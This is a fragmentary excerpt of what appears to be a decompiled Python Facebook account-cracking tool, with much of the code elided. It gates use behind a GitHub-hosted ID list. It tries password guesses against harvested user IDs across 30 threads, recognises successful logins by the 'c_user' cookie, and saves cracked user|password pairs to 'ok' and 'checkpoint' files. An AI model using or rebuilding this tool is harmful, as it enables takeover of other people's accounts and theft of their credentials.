"""
ispypy=debugLevelPy3Str
generated-from=GNU gdb (GDB) 10.1
python-opcode3.10.1
"""
#!/usr/bin/python3
#-*-coding:utf-8-*-
...
def main():
  ...
  id = "-".join(uuid)
  try:
    httpCaht = requests.get('https://raw.githubusercontent.com//HARISALI122/haris/server.txt').text
    if id in httpCaht:
...
def chigozie():
    ...
    if cookie in['OPEN','Open','open']:
      jalan("\n  %s* %sanda akan di arahkan ke YouTube"%(O,O));time.sleep(3);os.system('xdg-open https://wa.me/+923096092417');chigozie()
    try:
...
def hasil(OK,cp):
    if len(OK) != 0 or len(cp) != 0:
        ...
        print('----------------------------------------------')
        print(' [%s+%s] \033[1;97mTOTAL OK : %s --- \033[1;97mbsn-ok.txt'%(O,O,str(len(ok))))
        print(' [%s+%s] \033[1;97mTOTAL CP : %s --- \033[1;97mbsn-cp.txt'%(O,O,str(len(cp))))
        print('----------------------------------------------')
...
def bsn_menu():
    ...
    if pepek in['1','01']:
    	...
    	os.system('xdg-open https://www.facebook.com/100022047961256');bsn_menu()
class __bsn__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f'\r \033[1;92m[Haris] {loop}/{len(self.id)} OK={len(ok)}-CP={len(cp)} '),
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    try:
                        ...
                        print('\r%s \033[1;91m[Checkpoint] %s | %s ' % (K,user,pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('asad-cp.txt' , 'a').write('%s\n' % wrt)
                        break
...
#    <- Bot followers ->
    ...
    def __pler__(self):
        ...
        if chi == '':
            ...
            print('-------------------------------------------')
            print('')
            with ASADALI(max_workers=30) as kirim:
                for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = yntkts.split('|')
                        xz = name.split(' ')
